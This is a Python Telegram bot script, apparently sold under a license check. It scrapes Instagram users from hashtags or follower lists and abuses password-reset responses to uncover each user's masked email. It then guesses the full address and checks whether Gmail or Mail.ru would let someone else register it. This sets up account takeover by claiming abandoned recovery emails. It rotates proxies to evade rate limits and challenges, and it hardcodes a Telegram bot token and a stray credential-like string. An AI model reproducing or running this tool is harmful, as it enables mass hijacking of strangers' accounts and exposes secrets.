import time
import threading
import logging
import requests
from instagram_apiV2 import InstagramAPI
from mail_ru_checker import MailRuChecker
from gmail_checker import GmailChecker
from telebot import TeleBot
import threading
import time
BOT_TOKEN = "8229341966:AAGNmb-ww70Fe4xo3QA5vtkWN0sMRqhJGOQ" 
logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler("avalibleity.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
    
class AppState:
    IDLE = 0
    WAITING_SESSION = 1
    WAITING_TARGET = 2
    WAITING_PAGINATION = 4 # New State
    RUNNING = 3
class MainApp:
    def __init__(self):
        self.session = requests.Session()
        self.bot = TeleBot(BOT_TOKEN)
        self.chat_id = None
        self.mail_checker = MailRuChecker(self.session) 
        self.gmail_checker = GmailChecker(self.session) 
        self.api = None 
        self.state = AppState.IDLE
        self.session_id = None
        self.target = None
        self.stop_event = threading.Event()
        self.job_thread = None
        self.resume_max_id = None
        self.resume_rank_token = None
        self.seen_users = set()
        self.stats = {
            "scanned": 0,
            "mailru_avail": 0,
            "mailru_taken": 0,
            "gmail_avail": 0,
            "gmail_taken": 0,
            "ignored_domain": 0,
            "private_no_email": 0,
            "duplicates": 0,
            "errors": 0,
            "blocked_reset": 0, # New: Verified/Blocked
            "phone_only": 0,    # New: Phone Numbers
            "bad_match": 0,     # New: Couldn't predict
            "max_id": None}
        self.stats_message_id = None
        self.setup_handlers()
    def setup_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self.chat_id = message.chat.id
            if self.state == AppState.RUNNING:
                self.stop_event.set()
                if self.job_thread: 
                    self.job_thread.join()
                self.bot.send_message(message.chat.id, "Job stopped.")
            self.state = AppState.WAITING_SESSION
            self.session_id = None
            self.target = None
            self.stop_event.clear()
            self.bot.send_message(message.chat.id, "Welcome! Please send your Instagram **Session ID**.")
        @self.bot.message_handler(func=lambda m: True)
        def handle_text(message):
            self.chat_id = message.chat.id
            text = message.text.strip()
            chat_id = message.chat.id
            if self.state == AppState.WAITING_SESSION:
                logging.info(f"Received Session ID: {text}")
                self.session_id = text
                try:
                    self.api = InstagramAPI(self.session_id)
                    self.state = AppState.WAITING_TARGET
                    self.bot.send_message(chat_id, "Session ID Saved.\nNow send the **Hashtag** (e.g., #cars) or **Username** (@user) to scrape.")
                    return
                except Exception as e:
                    self.bot.send_message(chat_id, f"Error initializing API: {e}")
                    return
            elif self.state == AppState.WAITING_TARGET:
                self.target = text
                if self.target == self.session_id:
                    return
                
                self.state = AppState.WAITING_PAGINATION
                self.bot.send_message(chat_id, "Target Accepted.\n\n🔄 **Resume Job?**\nSend the **MaxID** (and **RankToken** for hashtags) to resume.\nFormat: `max_id` OR `max_id|rank_token`\n\nSend **'none'** or **'null'** to start from the beginning.")

            elif self.state == AppState.WAITING_PAGINATION:
                text_lower = text.lower()
                self.resume_max_id = None
                self.resume_rank_token = None
                
                if text_lower not in ['none', 'null', 'no']:
                    is_follower = self.target.startswith("@")
                    
                    if is_follower:
                        # Followers MaxID often contains '|', so take the whole text
                        self.resume_max_id = text.strip()
                    else:
                        # Hashtags might need RankToken separated by '|'
                        # Assuming Hashtag MaxID doesn't contain '|' usually, or user knows format
                        parts = text.split("|")
                        self.resume_max_id = parts[0].strip()
                        if len(parts) > 1:
                            self.resume_rank_token = parts[1].strip()
                            
                    self.bot.send_message(chat_id, f"Resuming from MaxID: {self.resume_max_id}")
                else:
                    self.bot.send_message(chat_id, "Starting fresh job...")

                self.state = AppState.RUNNING
                self.stop_event.clear()
                self.job_thread = threading.Thread(target=self.process_job, args=(chat_id,))
                self.job_thread.start()
            elif self.state == AppState.RUNNING:
                if text.lower() == "/stop":
                    self.stop_event.set()
                    self.bot.send_message(chat_id, "Stopping job...")
                else:
                    self.bot.send_message(chat_id, "Job is running. Send /stop to stop or /start to restart.")
    def format_stats(self):
        proxy_count = 0
        # if self.api:
        #      proxy_count = self.api.proxy_change_count

        return (
            f"📊 **Live Stats**\n"
            f"Target: {self.target}\n"
            f"📍 MaxID: `{self.stats.get('max_id')}`\n"
            f"🔄 Proxies: {proxy_count}\n"
            f"----------------------\n"
            f"🔍 Scanned: {self.stats['scanned']}\n"
            f"♻️ Duplicates: {self.stats['duplicates']}\n"
            f"🚫 Blocked Resets: {self.stats['blocked_reset']}\n"
            f"📱 Phone Only: {self.stats['phone_only']}\n"
            f"❓ Bad Matches: {self.stats['bad_match']}\n"
            f"📧 **MailRu**\n"
            f"   ✅ Free: {self.stats['mailru_avail']} | ❌ Taken: {self.stats['mailru_taken']}\n"
            f"📧 **Gmail**\n"
            f"   ✅ Free: {self.stats['gmail_avail']} | ❌ Taken: {self.stats['gmail_taken']}\n"
            f"----------------------\n"
            f"⚠️ API Errors: {self.stats['errors']}"
        )
    def process_job(self, chat_id):
        self.stats = {k: 0 for k in self.stats}
        self.stats['max_id'] = self.resume_max_id if self.resume_max_id else "Start"
        self.seen_users.clear()
        
        stats_msg_id = self.bot.send_message(chat_id, self.format_stats())
        self.stats_message_id = stats_msg_id.message_id     
        mode = "HASHTAG" if self.target.startswith("#") else "FOLLOWER"
        if not self.target.startswith("#") and not self.target.startswith("@"):
            if " " not in self.target:
                mode = "HASHTAG"        
        target_id = None
        if self.target.startswith("@"):
            target_id = self.target.lstrip("@")
            self.target = self.target.lstrip("@")
            # mode = "FOLLOWER"
            # username = self.target.lstrip("@")
            # target_id = self.api.resolve_username(username)
            # if not target_id:
            #     self.bot.send_message(chat_id, f"Could not resolve username {username}")
            #     return
        logging.info(f"Starting Job: {mode} on {self.target}")
        
        # Resume Logic
        next_max_id = self.resume_max_id
        rank_token = self.resume_rank_token
        
        while not self.stop_event.is_set():
            users = []
            try:
                if mode == "HASHTAG":
                    users, next_max_id, rank_token = self.api.get_hashtag_posts(self.target, next_max_id, rank_token)
                else:
                    users, next_max_id = self.api.get_user_followers(target_id, next_max_id)
                
                # Update Stats with new Max ID
                self.stats['max_id'] = next_max_id
                
                if not users and not next_max_id:
                    logging.info("No users found or end of list.")
                    self.bot.send_message(chat_id, "Job Finished (No more users).")
                    break
                for user in users:
                    if self.stop_event.is_set(): break
                    
                    if user["id"] in self.seen_users:
                         self.stats["duplicates"] += 1
                         continue
                    self.seen_users.add(user["id"])
                    
                    self.process_single_user(chat_id, user)
                    self.edit_message(chat_id, self.stats_message_id, self.format_stats())
                    if self.stats["errors"] >= 30:
                        self.stop_event.set()
                        self.bot.send_message(chat_id, "🚨 Job Stopped: Too many API errors (30+).")
                        break
                    time.sleep(1)
                if not next_max_id:
                    self.bot.send_message(chat_id, "Job Finished (End of Pagination).")
                    break
                time.sleep(2)
            except Exception as e:
                 logging.error(f"Job Critical Error: {e}")
                 if "ACCOUNT_BLOCKED" in str(e):
                      self.bot.send_message(chat_id, "🚨 **ACCOUNT BLOCKED FROM HASHTAG**\n(Checkpoint/Challenge Detected).\nJob Stopped.")
                      break
                 self.bot.send_message(chat_id, f"Error in loop: {e}")
                 break
        self.state = AppState.IDLE
        self.bot.send_message(chat_id, "Job Complete.")
    def predict_email(self, username, obfuscated_email):
        # obfuscated_email format example: "j*******e@g****.c**"
        try:
            if not obfuscated_email or "@" not in obfuscated_email:
                return None
                
            local_part, domain_part = obfuscated_email.split("@")
            
            # 1. Match Username Chars
            # Check first char
            if len(local_part) > 0 and len(username) > 0:
                if local_part[0] != "*" and local_part[0].lower() != username[0].lower():
                    return None
            # Check last char (if visible and length is sufficient)
            if len(local_part) > 1 and local_part[-1] != "*":
                 if local_part[-1].lower() != username[-1].lower():
                     return None
            
            # 2. Predict Domain
            # Google: g****.c** (starts with g)
            # Mail.ru: m***.r* (starts with m)
            # Inbox: i****.r*
            # List: l***.r*
            # Bk: b*.r*
            # Internet: i*******.r*
            # Yandex: y*****.r*
            
            if len(domain_part) < 1: return None
            domain_char = domain_part[0].lower()
            predicted_domain = None
            
            if domain_char == 'g':
                predicted_domain = "gmail.com"
            elif domain_char == 'm':
                predicted_domain = "mail.ru"
            elif domain_char == 'b':
                predicted_domain = "bk.ru"
            elif domain_char == 'l':
                predicted_domain = "list.ru"
            elif domain_char == 'i':
                 # inbox vs internet. Simple check: 'internet' length 8, 'inbox' 5.
                 # i****.r* (inbox, len 8 total usually displayed as stars)
                 # Heuristic: Default to inbox.ru for 'i'
                 predicted_domain = "inbox.ru"
            elif domain_char == 'y':
                predicted_domain = "yandex.ru"
            if not predicted_domain:
                return None
                
            # Construct Email
            return f"{username}@{predicted_domain}"
        except:
            return None

    def process_single_user(self, chat_id, user):
        user_id = user["id"]
        username = user["username"]
        self.stats["scanned"] += 1
        
        logging.info(f"Processing @{username}...")

        try:
            # 1. Probe with Password Reset using USERNAME
            retry_count = 0
            MAX_RETRIES = 15
            resp = None
            
            while retry_count < MAX_RETRIES:
                try:
                    resp = self.api.send_password_reset(username)
                    
                    # Network Error / Connection Error
                    if resp is None:
                        logging.warning(f"Probe Failed (ERROR IN THE REQUEST) for @{username}. Rotating...")
                        self.api._rotate_proxy()
                        retry_count += 1
                        self.stats["errors"] += 1
                        continue                    
                    # Handle Blocks / Rate Limits -> Retry
                    if resp.status_code in [403, 429, 401]:
                        logging.warning(f"Probe Blocked ({resp.status_code}) for @{username}. Rotating Proxy...")
                        self.api._rotate_proxy()
                        retry_count += 1
                        continue
                    
                    # Soft Blocks check (HTML content)
                    if "text/html" in resp.headers.get("Content-Type", ""):
                         if "please wait" in resp.text.lower() or "challenge" in resp.text.lower():
                             logging.warning(f"Probe Soft Block (HTML) for @{username}. Rotating Proxy...")
                             self.api._rotate_proxy()
                             retry_count += 1
                             continue

                    # Valid response
                    break
                    
                except Exception as e:
                     logging.error(f"Probe Loop Error: {e}")
                     retry_count += 1
                     time.sleep(1)
            
            if retry_count >= MAX_RETRIES:
                 logging.error(f"Failed to probe @{username} after {MAX_RETRIES} attempts. Skipping.")
                 return

            # 2. Check Probe Result
            if resp.status_code != 200:
                # Handle Specific Blocks
                if resp.status_code == 400:
                      try:
                          j = resp.json()
                          msg = j.get("message", "")
                          if isinstance(msg, list): msg = " ".join(msg)
                          
                          if "can't send you a link" in msg or "contact Instagram" in msg:
                              logging.warning(f"Reset Blocked for @{username} (Verified/High Profile)")
                              self.stats["blocked_reset"] += 1
                              return
                      except: pass

                logging.warning(f"Probe Failed for @{username}: {resp.status_code} - {resp.text[:60]}")
                if resp.status_code == 429:
                     logging.warning(f"Rate Limited (429) on Reset.")
                return
            
            logging.info(f"Probe Response for @{username}: {resp.text[:200]}")
            
            obfuscated_email = None
            data = {}
            try:
                data = resp.json()
                msg = data.get("message", "")
                if not msg and "body" in data: msg = data["body"] 
                
                import re
                match = re.search(r'[\w\.\*]+@[\w\.\*]+', msg)
                if match:
                    obfuscated_email = match.group(0)
            except Exception as e:
                logging.error(f"JSON Parse Error @{username}: {e}")
                
            if not obfuscated_email:
                # Check for Phone Number vs Generic
                msg = str(data.get("message", ""))
                if ("+" in msg or "sms" in msg.lower()) and "check" in msg.lower():
                     logging.info(f"Phone Number Found for @{username}")
                     self.stats["phone_only"] += 1
                else:
                     logging.info(f"No Email in Reset Resp for @{username}")
                     self.stats["private_no_email"] += 1
                return

            # 2. Predict Email
            predicted_email = self.predict_email(username, obfuscated_email)
            if not predicted_email:
                logging.info(f"Prediction Failed for @{username} (Obfuscated: {obfuscated_email})")
                self.stats["bad_match"] += 1
                return
            
            logging.info(f"Predicted for @{username}: {predicted_email}")
            
            # 3. Check Availability on Provider
            domain = predicted_email.split("@")[-1]
            is_taken = True
            service_name = "Unknown"
            
            if "gmail.com" in domain:
                service_name = "Gmail"
                is_taken = self.gmail_checker.check(predicted_email)
                if is_taken: self.stats["gmail_taken"] += 1
                else: self.stats["gmail_avail"] += 1
            elif any(d in domain for d in ["mail.ru", "bk.ru", "inbox.ru", "list.ru"]):
                service_name = "MailRu"
                is_taken = self.mail_checker.check(predicted_email)
                if is_taken: self.stats["mailru_taken"] += 1
                else: self.stats["mailru_avail"] += 1
            else:
                self.stats["ignored_domain"] += 1
                return

            if is_taken:
                logging.info(f"Taken: {predicted_email}")
                return 
            
            # 4. Verification
            logging.info(f"Available! Verifying {predicted_email}...")
            verify_resp = self.api.send_password_reset_by_email(predicted_email)
            is_verified_link = False
            
            if verify_resp and verify_resp.status_code == 200:
                 v_data = verify_resp.json()
                 if v_data.get("status") == "ok" and "sent an email" in v_data.get("message", "").lower():
                     is_verified_link = True
            
            if is_verified_link:
                msg = (
                    f"✅ **CONFIRMED AVAILABLE & LINKED {service_name.upper()}**\n"
                    f"User: @{username}\n"
                    f"Email: `{predicted_email}`\n"
                    f"Link: https://instagram.com/{username}\n"
                )
                self.bot.send_message(chat_id, msg)
                logging.info(f"CONFIRMED MATCH: {predicted_email} is linked to @{username}")
            else:
                 logging.info(f"Verification Failed for {predicted_email} (Not linked or Rate Limited)")

        except Exception as e:
            logging.error(f"Err proc {username}: {e}")
    def edit_message(self, chat_id, message_id, text):
        try:
            self.bot.edit_message_text(text, chat_id, message_id)
        except Exception as e:
            print(f"Telegram Edit Error: {e}")

def check_license():
    logging.info("Checking license...")
    try:
        PASTEBIN_URL = "https://gist.githubusercontent.com/Mohamed-TBAG/a50872f06daf27bdbd324bb72205c8a4/raw/24c3d6d1f48a8d56c4d34e001d191fe7b96a222f/gistfile1.txt"      
        # Explicitly disable proxies for license check
        response = requests.get(PASTEBIN_URL, timeout=15, proxies={})
        if response.status_code == 200:
            if "mohamedoscar" in response.text:
                logging.info("License Verified! ✅")
                return True
            else:
                logging.error("License Invalid or Expired.")
                return False
    except Exception as e:
        logging.error(f"License check failed: {e}")
    return False
if __name__ == "__main__":
    if check_license():
        app = MainApp()
        logging.error("Bot is polling...")
        try:
            app.bot.infinity_polling()
        except KeyboardInterrupt:
            app.stop_event.set()
            logging.error("Stopped.")
    else:
        logging.error("\n❌ License Invalid or Expired.")
        logging.error("Please contact the developer to activate this software.")
        input("\nPress Enter to exit...")
        "80062757476:l7IHH3QyCQWXZk:0:AYhBDcEaxaO_HEoi9ilZEnslz0kC7bWMxVpglT3tHw"